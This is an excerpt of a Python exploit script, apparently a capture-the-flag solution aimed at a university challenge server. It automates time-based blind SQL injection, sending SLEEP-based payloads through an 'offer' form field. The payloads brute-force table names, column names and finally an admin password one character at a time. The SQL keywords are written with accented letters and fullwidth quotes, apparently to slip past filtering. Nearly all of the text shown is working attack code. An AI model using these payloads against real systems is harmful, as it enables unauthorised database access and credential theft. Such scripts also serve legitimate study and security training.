...
# Global constants
BASE_URL = "http://cyberchallenge.disi.unitn.it:50055"
        ...
        while True:
            ...
            for c in string.printable:
                ...
                if found_tables:
                    ...
                    exclusion = f" ÀND TABLE_NAME NOT IN ({excluded})"

                payload = f"1 ÀND (SELÈCT SLEÈP({SLEEP_TIME}) FROM {table} WHERÈ HEX(TABLE_NAME) LIKE ＇{hex_prefix}%＇ {exclusion})"
    ...
    while True:
        ...
        while True:
            ...
            for c in string.printable:
                ...
                exclusion = ""
                if found_columns:
                    excluded = ",".join(f"＇{col}＇" for col in found_columns)
                    exclusion = f" ÀND COLUMN_NAME NOT IN ({excluded})"

                payload = f"1 ÀND (SELÈCT SLEÈP({SLEEP_TIME}) FROM {table} WHERÈ TABLE_NAME LIKE ＇{table_name}＇ ÀND HEX(COLUMN_NAME) LIKE ＇{hex_prefix}%＇ {exclusion})"
...
def admin_password(session: requests.Session):
    ...
    while True:
        ...
        for c in string.printable:
            ...
            payload = f"1 ÀND (SELÈCT SLEÈP({SLEEP_TIME}) FROM {table} WHERÈ username LIKE ＇{username}＇ ÀND HEX({column}) LIKE ＇{hex_prefix}%＇)"
            data = {"offer": f"{payload}"}
